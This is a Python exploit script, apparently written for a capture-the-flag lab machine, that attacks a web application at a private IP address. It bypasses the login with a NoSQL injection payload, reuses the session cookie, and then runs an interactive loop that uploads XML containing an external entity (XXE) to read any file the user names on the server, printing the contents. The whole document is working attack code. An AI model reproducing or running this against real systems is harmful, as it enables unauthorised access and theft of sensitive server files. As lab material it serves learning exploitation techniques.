import requests
import re

url = "http://10.10.11.139:5000"

# First request to /login
headers_login = {
    "Content-Type": "application/json"
}
data_login = {"user": "admin", "password": {"$ne": "bar"}}

print("[!] Authenticating.")
response_login = requests.post(url + "/login", json=data_login, headers=headers_login)

# Extracting the cookie from the response
cookie = response_login.cookies.get_dict()
if cookie:
    print("[!] Got cookie:", cookie)
else:
    print("[-] Login failed!")

while True:
    filename = input("file:>")
    
    if filename.lower() == "exit":
        break

    # Second request to /articles/xml
    files = {"file": ("xxe.xml", f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file://{filename}"> ]>
<post>
        <title>Example Post</title>
        <description>desc</description>
        <markdown>&xxe;</markdown>
</post>
''')}

    # Sending the second request with the cookie from the first response
    response_articles = requests.post(url + "/articles/xml", cookies=cookie, files=files)

    try:
        file_content = re.findall('<textarea required name="markdown" id="markdown" class="form-control">(.*)</textarea>', response_articles.text.replace('\n', '@@@'))
        if len(file_content) > 0:
            print(file_content[0].replace('@@@', '\n').replace("&#39;", "'").replace('&#34;', '"'))
        else:
            print("Access Denied")
    except Exception as e:
        print(e)
        print("============================================================================")
        print("[-] Raw Request")
        print(response_articles.request.url)
        print(response_articles.request.headers)
        print(response_articles.request.body)
        print("============================================================================")
        print("[-] Raw Response")
        print(response_articles.text)
